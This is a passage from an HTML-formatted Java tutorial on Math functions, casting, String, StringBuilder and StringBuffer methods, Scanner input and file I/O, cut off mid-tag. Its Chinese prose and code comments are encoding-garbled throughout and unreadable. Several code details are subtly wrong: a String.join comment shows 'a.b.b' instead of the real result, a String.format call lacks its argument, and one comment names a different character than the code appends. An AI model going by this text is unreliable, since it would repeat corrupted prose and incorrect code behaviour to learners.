Math.pow(x,a);</code>ã€‚powæ–¹æ³•æœ‰2ä¸ªdoubleç±»å‹å‚æ•°ï¼Œè¿”å›ç»“æœä¹Ÿæ˜¯doubleç±»å‹ã€‚</p><p>æ­¤å¤–è¿˜æœ‰2ä¸ªæœ€æ¥è¿‘çš„è¿‘ä¼¼å€¼ï¼š<code>Math.PI</code>å’Œ<code>Math.E</code>æ¥è¡¨ç¤ºÏ€å’Œeã€‚</p><p>é™æ€å¯¼å…¥ï¼š<code>import static java.lang.Math.*</code></p><p>å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯åœ¨åœ†æ‹¬å·ä¸­ç»™å‡ºæƒ³è¦è½¬æ¢çš„ç›®æ ‡ç±»å‹ï¼Œåé¢ç´§è·Ÿå¾…è½¬æ¢çš„å˜é‡åï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">9.997</span><span class="token punctuation">;</span><span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h5 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a><strong>å­—ç¬¦ä¸²</strong></h5><p>Javaæ²¡æœ‰å†…ç½®çš„å­—ç¬¦ä¸²ç±»å‹ï¼Œè€Œæ˜¯åœ¨æ ‡å‡†Javaç±»åº“ä¸­æä¾›äº†ä¸€ä¸ªé¢„å®šä¹‰ç±»ï¼Œå«åšStringã€‚æ¯ä¸ªç”¨åŒå¼•å·æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²éƒ½æ˜¯Stringç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>ç”¨substringæ–¹æ³•æå–å­—ä¸²</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> feng <span class="token operator">=</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span><span class="token class-name">String</span> s <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "l"</span></code></pre><p>Javaè¯­è¨€å…è®¸ç”¨<code>+</code>å·æ‹¼æ¥å­—ç¬¦ä¸²ã€‚</p><p>å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ä¸€ä¸ªéå­—ç¬¦ä¸²çš„å€¼è¿›è¡Œæ‹¼æ¥æ—¶ï¼Œåè€…ä¼šè½¬æ¢æˆå­—ç¬¦ä¸²ã€‚</p><p>æŠŠå¤šä¸ªå­—ç¬¦ä¸²æ”¾ä¸€èµ·ï¼Œç”¨ä¸€ä¸ªç•Œå®šç¬¦åˆ†å‰²ï¼Œç”¨é™æ€æ–¹æ³•joinï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a.b.b</span></code></pre><p><strong>Stringç±»æ²¡æœ‰æä¾›ä¿®æ”¹å­—ç¬¦ä¸²ä¸­æŸä¸ªå­—ç¬¦çš„æ–¹æ³•ã€‚</strong>å¯ä»¥æå–æƒ³è¦ä¿ç•™çš„å­—ä¸²ï¼Œå†ä¸å¸Œæœ›æ›¿æ¢çš„å­—ç¬¦æ‹¼æ¥ã€‚</p><p>ç”±äºä¸èƒ½ä¿®æ”¹Javaå­—ç¬¦ä¸²ä¸­çš„å•ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åœ¨Javaæ–‡æ¡£ä¸­å°†Stringç±»å¯¹è±¡ç§°ä¸ºæ˜¯ä¸å¯å˜çš„ã€‚</p><p><strong>å¯ä»¥ä½¿ç”¨equalsæ–¹æ³•æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰</strong>ã€‚ä¸åŒºåˆ†å¤§å°å†™å¯ä»¥ç”¨<code>equalsIgnoreCase</code>ã€‚</p><p>ä¸è¦ä½¿ç”¨<code>==</code>æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ã€‚å®ƒåªèƒ½ç¡®å®šä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å­˜æ”¾åœ¨åŒä¸€ä½ç½®ä¸Šã€‚</p><p>ç©ºå­—ç¬¦ä¸²æ˜¯é•¿åº¦ä¸º0çš„å­—ç¬¦ä¸²ï¼Œæ£€æŸ¥æ–¹å¼ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦æ˜¯nullï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span></code></pre><p>lengthæ–¹æ³•å°†è¿”å›é‡‡ç”¨UTF-16ç¼–ç è¡¨ç¤ºç»™å®šå­—ç¬¦ä¸²æ‰€éœ€è¦çš„ä»£ç å•å…ƒæ•°é‡ã€‚</p><p>æ¯æ¬¡æ‹¼æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œéƒ½ä¼šæ„å»ºä¸€ä¸ªæ–°çš„Stringå¯¹è±¡ï¼Œå³è€—æ—¶ï¼Œåˆæµªè´¹ç©ºé—´ã€‚ä½¿ç”¨StringBuilderç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> completedString <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>completedString<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨ä½¿ç”¨ StringBuffer ç±»æ—¶ï¼Œæ¯æ¬¡éƒ½ä¼šå¯¹ StringBuffer å¯¹è±¡æœ¬èº«è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯ç”Ÿæˆæ–°çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹æ¨èä½¿ç”¨ StringBufferã€‚</p><p>StringBuilder ç±»åœ¨ Java 5 ä¸­è¢«æå‡ºï¼Œå®ƒå’Œ StringBuffer ä¹‹é—´çš„æœ€å¤§ä¸åŒåœ¨äº StringBuilder çš„æ–¹æ³•ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆä¸èƒ½åŒæ­¥è®¿é—®ï¼‰ã€‚</p><p>ç”±äº StringBuilder ç›¸è¾ƒäº StringBuffer æœ‰é€Ÿåº¦ä¼˜åŠ¿ï¼Œæ‰€ä»¥å¤šæ•°æƒ…å†µä¸‹å»ºè®®ä½¿ç”¨ StringBuilder ç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Study</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//é‡å†™Objectç±»ä¸­toString()æ–¹æ³•</span><span class="token keyword">return</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">StringBuffer</span> s1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"abcd1234!?,;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321987654"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> s3<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">"987654321"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"â†“â†“â†“StringBufferç±»çš„ä¸€äº›å¸¸ç”¨æ–¹æ³•å¦‚ä¸‹â†“â†“â†“"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å­—ç¬¦ä¸²s1çš„é•¿åº¦ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿”å›å­—ç¬¦ä¸²çš„å®é™…é•¿åº¦</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å­—ç¬¦ä¸²s1æ‰€å å®¹å™¨çš„å¤§å°ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿”å›å­—ç¬¦ä¸²æ‰€å å®¹å™¨çš„æ€»å¤§å°</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è·å–å­—ç¬¦ä¸²s1ä¸­ç¬¬2ä¸ªä½ç½®çš„å­—ç¬¦ï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å­å­—ç¬¦ä¸²'654'ç¬¬ä¸€æ¬¡å‡ºç°åœ¨å­—ç¬¦ä¸²s2ä¸­çš„ç´¢å¼•ä¸ºï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä»æŒ‡å®šçš„ç´¢å¼•6å¼€å§‹æœç´¢ï¼Œè¿”å›å­å­—ç¬¦ä¸²'654'ç¬¬ä¸€æ¬¡å‡ºç°åœ¨å­—ç¬¦ä¸²s2ä¸­çš„ç´¢å¼•ï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"654"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å­å­—ç¬¦ä¸²'987'æœ€åä¸€æ¬¡å‡ºç°åœ¨å­—ç¬¦ä¸²s2ä¸­çš„ç´¢å¼•ä¸ºï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"987"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä»æŒ‡å®šçš„ç´¢å¼•5å¼€å§‹åå‘æœç´¢ï¼Œè¿”å›å­—ç¬¦ä¸²'87'åœ¨å­—ç¬¦ä¸²s2ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"87"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token char">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨å­—ç¬¦ä¸²s1çš„æœ«å°¾æ·»åŠ å­—ç¬¦'c'</span>s1<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨å­—ç¬¦ä¸²s1çš„æœ«å°¾æ·»åŠ å­—ç¬¦ä¸²"Java"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s1ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨ç¬¬4ä¸ªä½ç½®æ’å…¥å­—ç¬¦ä¸²"abcd"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s1ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">deleteCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤å­—ç¬¦ä¸²s1ä¸­ç¬¬ä¸€ä¸ªä½ç½®çš„å­—ç¬¦</span>s1<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤å­—ç¬¦ä¸²s1ä¸­ç¬¬2åˆ°ç¬¬4ä¸ªä½ç½®çš„å­—ç¬¦</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s1ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"5678"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å­—ç¬¦ä¸²s1ä¸­ç¬¬4åˆ°ç¬¬7ä¸ªä½ç½®çš„å­—ç¬¦ä¸²ä¿®æ”¹ä¸º"5678"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s1ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s1<span class="token punctuation">.</span><span class="token function">setCharAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å­—ç¬¦ä¸²s1ä¸­ç¬¬ä¸€ä¸ªä½ç½®çš„å­—ç¬¦ä¿®æ”¹ä¸º'b'</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s1ä¸ºï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s2<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å­—ç¬¦ä¸²s2åè½¬</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¿®æ”¹åçš„å­—ç¬¦ä¸²s2ä¸ºï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æˆªå–å­—ç¬¦ä¸²s1ä»ç¬¬4ä¸ªä½ç½®å¼€å§‹åˆ°ç»“å°¾ï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æˆªå–å­—ç¬¦ä¸²s1ä»ç¬¬4ä¸ªä½ç½®å¼€å§‹åˆ°ç¬¬7ä¸ªä½ç½®ç»“å°¾ï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è·å–s1çš„å˜é‡ç±»å‹ï¼š"</span> <span class="token operator">+</span> s1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å°†å¯¹è±¡ä¿¡æ¯è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼š"</span> <span class="token operator">+</span> s2<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¯»å–è¾“å…¥ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> s1 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¯»å–ä¸€è¡Œè¾“å…¥</span><span class="token class-name">String</span> s2 <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è¯»å–ä¸€ä¸ªå•è¯ï¼Œä»¥ç©ºç™½ç¬¦ä½œä¸ºåˆ†å‰²ã€‚</span><span class="token keyword">int</span> age <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è¯»å–ä¸€ä¸ªæ•´æ•°</span><span class="token keyword">double</span> feng <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ³¨æ„è¦åŠ ä¸Š<code>import java.util.*</code>ã€‚å½“ä½¿ç”¨çš„ç±»ä¸æ˜¯å®šä¹‰åœ¨åŸºæœ¬java.langåŒ…ä¸­æ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨importæŒ‡ä»¤å¯¼å…¥ç›¸åº”çš„åŒ…ã€‚</p><p>æ ¼å¼åŒ–è¾“å‡ºï¼š</p><p><code>System.out.print(x)</code>å°†æ•°å€¼xè¾“å‡ºåˆ°æ§åˆ¶å°ã€‚è¿™æ¡å‘½ä»¤å°†ä»¥xçš„ç±»å‹æ‰€å…è®¸çš„æœ€å¤§é0æ•°ä½ä¸ªæ•°æ‰“å°è¾“å‡ºxã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">1000.0</span><span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Javaä¹Ÿæ²¿ç”¨äº†Cè¯­è¨€çš„printfï¼Œå…·ä½“ä½¿ç”¨ä¸è¯´äº†ã€‚</p><p>å¯ä»¥ä½¿ç”¨é™æ€çš„String.formatæ–¹æ³•åˆ›å»ºä¸€ä¸ªæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œä¸æ‰“å°è¾“å‡ºï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> x <span class="token operator">=</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"hello,%s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ–‡ä»¶è¾“å…¥ä¸è¾“å‡ºï¼š</p><p>è¦æƒ³è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªScannerå¯¹è±¡ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Path</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"Java.iml"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¦æƒ³å†™å…¥æ–‡ä»¶ï¼Œå°±éœ€è¦æ„é€ ä¸€ä¸ªPrintWriterå¯¹è±¡ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token class-name">StandardCharsets</span><span class="token 